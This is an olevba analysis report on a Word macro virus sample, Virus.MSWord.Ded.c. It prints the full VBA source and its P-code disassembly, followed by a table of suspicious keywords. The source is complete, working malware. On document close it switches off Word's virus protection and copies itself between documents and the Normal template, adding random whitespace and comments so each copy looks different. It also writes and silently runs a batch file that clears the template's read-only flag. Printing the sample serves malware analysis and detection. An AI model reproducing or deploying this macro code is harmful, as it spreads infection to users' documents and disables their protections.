olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 _
      Private Sub Document_New()

End Sub
'70.90379
        Private _
Sub Document_Close()

       On _
Error GoTo skam

     Options.VirusProtection = _
False

 _
SWL

          ABS99
'41.27668
skam:
'58.3359
 _
End Sub

     Private Sub SWL()
'46.298
        If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
  For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
    d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

          If Len(d) > 0 _
And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

  While _
Mid(d, Len(d) - 1, 2) = " _"

  i _
= i + 1

 _
   d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
  Wend

 _
  d = e(d)

              ActiveDocument.VBProject.VBComponents(1).CodeModule. _
InsertLines i * 2, d

 _
          End If

 _
Next i

 _
    ActiveDocument.SaveAs AddToRecentFiles:=False

 _
      End If

  End _
Sub

 _
       Private Sub ABS99()

           If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        f _
(NormalTemplate.FullName)

             For _
i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
     d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
    If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
While Mid(d, Len(d) - 1, 2) = " _"

 _
    i = i + 1

 _
 d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
   Wend

 _
 d = e(d)

 _
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
 End If

 _
    Next i

 _
  NormalTemplate.Save

  End If
'78.44886
             End Sub
'69.6285
 _
  Private Function e(aString) As String

 _
    For i = 1 To Len(aString) - 1

 _
    While Mid(aString, i, 2) = " "

            aString _
= Left(aString, i) & Right(aString, Len(aString) - i - 1)

 _
   Wend

 _
          If Mid(aString, i, 1) = "." Then

        If Not _
Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

 _
    If Not Mid(aString, i + 1, 1) = Chr$(34) Then

 _
    e = Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
  For j = 1 To Int(15 * Rnd)

 _
       e = " " & e

 _
  Next j

            Exit Function
'49.20062
 _
       End If

 _
       End If

          Else
'99.14024
 _
        If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

              If Not Mid(aString, _
i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

 _
 e = Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
         For j = 1 To Int(15 * Rnd)

 _
e = " " & e

    Next j
'25.8442
 _
Exit Function

 _
   End If

 _
          End If

 _
   End If

 _
         Next i

   e _
= aString & Chr$(13) & "'" & (100 * Rnd)

 _
Count = Int(15 * Rnd)

         For j = 1 _
To Count

 _
        e = " " & e

        Next j
'49.9257
 _
         End Function

 _
   Private Sub f(fName)

 _
        If GetAttr(fName) And vbReadOnly Then

 _
 Open Dir(fName) & ".bat" For Append As #1

 _
 Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

           Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

 _
      Close #1

 _
 shellResult = Shell(Dir(fName) & ".bat", vbHide)

             End If
'58.24844
      End Sub
'73.35107
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7860 bytes
' Line #0:
' 	LineCont 0x0004 00 00 06 00
' 	FuncDefn (Private Sub Document_New())
' Line #1:
' Line #2:
' 	EndSub 
' Line #3:
' 	QuoteRem 0x0000 0x0008 "70.90379"
' Line #4:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' Line #6:
' 	LineCont 0x0004 01 00 00 00
' 	OnError skam 
' Line #7:
' Line #8:
' 	LineCont 0x0004 04 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' Line #10:
' 	LineCont 0x0004 00 00 00 00
' 	ArgsCall SWL 0x0000 
' Line #11:
' Line #12:
' 	ArgsCall ABS99 0x0000 
' Line #13:
' 	QuoteRem 0x0000 0x0008 "41.27668"
' Line #14:
' 	Label skam 
' Line #15:
' 	QuoteRem 0x0000 0x0007 "58.3359"
' Line #16:
' 	LineCont 0x0004 00 00 00 00
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Private Sub SWL())
' Line #19:
' 	QuoteRem 0x0000 0x0006 "46.298"
' Line #20:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #21:
' Line #22:
' 	LineCont 0x0004 00 00 02 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #23:
' Line #24:
' 	LineCont 0x0004 00 00 04 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #25:
' Line #26:
' 	LineCont 0x0004 07 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #27:
' Line #28:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #29:
' Line #30:
' 	LineCont 0x0004 01 00 00 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #31:
' Line #32:
' 	LineCont 0x0004 00 00 03 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #33:
' Line #34:
' 	LineCont 0x0004 00 00 02 00
' 	Wend 
' Line #35:
' Line #36:
' 	LineCont 0x0004 00 00 02 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #37:
' Line #38:
' 	LineCont 0x0004 0B 00 00 00
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' Line #40:
' 	LineCont 0x0004 00 00 0A 00
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	LineCont 0x0004 00 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' Line #44:
' 	LineCont 0x0004 00 00 04 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #45:
' Line #46:
' 	LineCont 0x0004 00 00 06 00
' 	EndIfBlock 
' Line #47:
' Line #48:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #49:
' Line #50:
' 	LineCont 0x0004 00 00 07 00
' 	FuncDefn (Private Sub ABS99())
' Line #51:
' Line #52:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #53:
' Line #54:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #55:
' Line #56:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #57:
' Line #58:
' 	LineCont 0x0004 00 00 05 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #59:
' Line #60:
' 	LineCont 0x0004 00 00 04 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #61:
' Line #62:
' 	LineCont 0x0004 00 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #63:
' Line #64:
' 	LineCont 0x0004 00 00 04 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #65:
' Line #66:
' 	LineCont 0x0004 00 00 01 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #67:
' Line #68:
' 	LineCont 0x0004 00 00 03 00
' 	Wend 
' Line #69:
' Line #70:
' 	LineCont 0x0004 00 00 01 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #71:
' Line #72:
' 	LineCont 0x0004 00 00 00 00
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #73:
' Line #74:
' 	LineCont 0x0004 00 00 01 00
' 	EndIfBlock 
' Line #75:
' Line #76:
' 	LineCont 0x0004 00 00 04 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #77:
' Line #78:
' 	LineCont 0x0004 00 00 02 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #79:
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	QuoteRem 0x0000 0x0008 "78.44886"
' Line #82:
' 	EndSub 
' Line #83:
' 	QuoteRem 0x0000 0x0007 "69.6285"
' Line #84:
' 	LineCont 0x0004 00 00 02 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #85:
' Line #86:
' 	LineCont 0x0004 00 00 04 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #87:
' Line #88:
' 	LineCont 0x0004 00 00 04 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	While 
' Line #89:
' Line #90:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld i 
' 	ArgsLd LBound 0x0002 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St aString 
' Line #91:
' Line #92:
' 	LineCont 0x0004 00 00 03 00
' 	Wend 
' Line #93:
' Line #94:
' 	LineCont 0x0004 00 00 0A 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #95:
' Line #96:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #97:
' Line #98:
' 	LineCont 0x0004 00 00 04 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #99:
' Line #100:
' 	LineCont 0x0004 00 00 04 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #101:
' Line #102:
' 	LineCont 0x0004 00 00 02 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #103:
' Line #104:
' 	LineCont 0x0004 00 00 07 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #105:
' Line #106:
' 	LineCont 0x0004 00 00 02 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' Line #108:
' 	ExitFunc 
' Line #109:
' 	QuoteRem 0x0000 0x0008 "49.20062"
' Line #110:
' 	LineCont 0x0004 00 00 07 00
' 	EndIfBlock 
' Line #111:
' Line #112:
' 	LineCont 0x0004 00 00 07 00
' 	EndIfBlock 
' Line #113:
' Line #114:
' 	ElseBlock 
' Line #115:
' 	QuoteRem 0x0000 0x0008 "99.14024"
' Line #116:
' 	LineCont 0x0004 00 00 08 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #117:
' Line #118:
' 	LineCont 0x0004 06 00 00 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #119:
' Line #120:
' 	LineCont 0x0004 00 00 01 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #121:
' Line #122:
' 	LineCont 0x0004 00 00 09 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #123:
' Line #124:
' 	LineCont 0x0004 00 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #125:
' Line #126:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	QuoteRem 0x0000 0x0007 "25.8442"
' Line #128:
' 	LineCont 0x0004 00 00 00 00
' 	ExitFunc 
' Line #129:
' Line #130:
' 	LineCont 0x0004 00 00 03 00
' 	EndIfBlock 
' Line #131:
' Line #132:
' 	LineCont 0x0004 00 00 0A 00
' 	EndIfBlock 
' Line #133:
' Line #134:
' 	LineCont 0x0004 00 00 03 00
' 	EndIfBlock 
' Line #135:
' Line #136:
' 	LineCont 0x0004 00 00 09 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #137:
' Line #138:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #139:
' Line #140:
' 	LineCont 0x0004 00 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #141:
' Line #142:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #143:
' Line #144:
' 	LineCont 0x0004 00 00 08 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #145:
' Line #146:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #147:
' 	QuoteRem 0x0000 0x0007 "49.9257"
' Line #148:
' 	LineCont 0x0004 00 00 09 00
' 	EndFunc 
' Line #149:
' Line #150:
' 	LineCont 0x0004 00 00 03 00
' 	FuncDefn (Private Sub False(fName))
' Line #151:
' Line #152:
' 	LineCont 0x0004 00 00 08 00
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #153:
' Line #154:
' 	LineCont 0x0004 00 00 01 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #155:
' Line #156:
' 	LineCont 0x0004 00 00 01 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #157:
' Line #158:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #159:
' Line #160:
' 	LineCont 0x0004 00 00 06 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #161:
' Line #162:
' 	LineCont 0x0004 00 00 01 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #163:
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	QuoteRem 0x0000 0x0008 "58.24844"
' Line #166:
' 	EndSub 
' Line #167:
' 	QuoteRem 0x0000 0x0008 "73.35107"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

